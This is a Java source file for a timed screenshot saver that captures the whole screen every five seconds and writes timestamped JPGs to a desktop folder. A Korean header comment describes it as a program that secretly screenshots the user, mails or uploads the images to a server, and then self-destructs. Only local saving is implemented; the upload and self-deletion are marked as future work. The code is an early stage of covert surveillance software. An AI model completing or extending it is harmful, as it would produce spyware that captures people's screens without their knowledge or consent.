package screenshot;
//References : https://www.geeksforgeeks.org/java-program-take-screenshots/
/*
 * Auto screenshot saver : 
 * 매 time period 마다 사용자 모르게 스크린샷을 저장 후 특정 server 혹은 mail로 보내고 자가 파기하는 프로그램
 * ==> 저장 까지 구현 완료 / 메일링 기능은 차후 구현 예정
 * 
 * */
import java.awt.AWTException; 
import java.awt.Rectangle; 
import java.awt.Toolkit; 
import java.awt.Robot; 
import java.awt.image.BufferedImage; 
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Timer;
import java.util.TimerTask;
import java.io.File; 
import javax.imageio.ImageIO; 

class task{
	static TimerTask task = new TimerTask() {
    public void run() {
    	try { 
            Thread.sleep(120); 
            Robot r = new Robot(); 
  
            // It saves screenshot to desired path 
            String path = "C:\\Users\\example\\Desktop\\screenshot\\scs_"; 
            String path2 = "C:\\Users\\example\\Desktop\\screenshot";
            //디렉토리가 없을 경우 생성할 path2
            
            // Used to get ScreenSize and capture image 
            Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); 
            BufferedImage Image = r.createScreenCapture(capture); 
            //========================================================
            SimpleDateFormat format1 = new SimpleDateFormat ( "yyyy_MM_dd_HH_mm_ss");

            String format_time1 = format1.format (System.currentTimeMillis());
            
            format_time1 = format_time1+".jpg"; //스크린샷 날짜 포맷 추가해서 저장
            path = path + format_time1;
           
            //========================================================
        	File Folder = new File(path2);
        	if (!Folder.exists()) {
        		try{
        		    Folder.mkdir(); //make folder
        		    } 
        	        catch(Exception e){
        			    e.getStackTrace();
        			}        
        	         }else {
        			//System.out.println("directory already exist!");
        		}
        	//----------------------------------------------------------------
        	

            ImageIO.write(Image, "jpg", new File(path)); //스크린샷 생성
            System.out.println("Screenshot saved");
            
        } 
        catch (AWTException | IOException | InterruptedException ex) { 
            System.out.println(ex); 
        } 
	}	
};
}


public class screenshots {
	
	public static final long serialVersionUID = 1L;
	public static void main(String[] args) {
		new Timer().schedule(task.task, 500, 5000);
		//usage : public void schedule(TimerTask task,long delay,long period)
			//long delay : milliseconds before task is to be executed.
			//period : time in milliseconds between successive task executions.
    }
	
} 




